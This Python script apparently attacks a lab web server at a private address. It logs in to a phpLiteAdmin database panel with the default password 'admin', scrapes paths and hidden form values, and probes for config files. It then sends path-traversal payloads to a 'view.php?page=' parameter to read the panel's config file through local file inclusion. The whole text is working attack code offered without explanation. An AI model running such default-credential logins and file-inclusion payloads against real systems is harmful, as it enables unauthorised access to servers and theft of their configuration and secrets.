#!/usr/bin/env python3
"""Find phpLiteAdmin database storage path"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Get main page
r = s.get(PHPLITE, timeout=15)

# Find paths
paths = re.findall(r'[a-zA-Z]:[/\\][^\s<"]+|/[\w]+/[^\s<"]+', r.text)
print('Paths found in page:')
for p in sorted(set(paths)):
    if len(p) > 3 and len(p) < 200:
        print(f'  {p}')

# Find database directory config
# Look for hidden inputs and select options
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']', r.text)
print('\nHidden inputs:')
for name, val in inputs:
    print(f'  {name} = {val}')

inputs2 = re.findall(r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']([^"\']+)["\']', r.text)
print('\nHidden inputs (reversed):')
for val, name in inputs2:
    print(f'  {name} = {val}')

# Look for the current directory
dir_refs = re.findall(r'directory.*?value=["\']([^"\']+)["\']', r.text, re.I)
print(f'\nDirectory references: {dir_refs}')

# Try to find the phpLiteAdmin config
# Usually it's in the same directory or defined in a config file
print('\n--- Checking phpLiteAdmin config paths ---')
test_paths = [
    '/dbadmin/.htaccess',
    '/dbadmin/phpliteadmin.config.php', 
    '/dbadmin/config.php',
]

for p in test_paths:
    try:
        rr = s.get(f'{BASE}{p}', timeout=5)
        print(f'  {p}: {rr.status_code} ({len(rr.text)} bytes)')
        if rr.status_code == 200 and len(rr.text) > 10:
            print(f'    Content: {rr.text[:300]}')
    except Exception as e:
        print(f'  {p}: {e}')

# Also try LFI to find config
print('\n--- LFI to find phpLiteAdmin config ---')
lfi_paths = [
    '../../../var/www/html/dbadmin/phpliteadmin.config.php',
    '../../../var/www/dbadmin/phpliteadmin.config.php',
]
for p in lfi_paths:
    try:
        rr = s.get(f'{BASE}/view.php?page={p}', timeout=5)
        print(f'  LFI {p}: {rr.status_code} ({len(rr.text)} bytes)')
        if rr.status_code == 200 and len(rr.text) > 10 and 'Hacking' not in rr.text:
            clean = re.sub(r'<[^>]+>', '', rr.text).strip()
            print(f'    Content: {clean[:300]}')
    except Exception as e:
        print(f'  {p}: {e}')
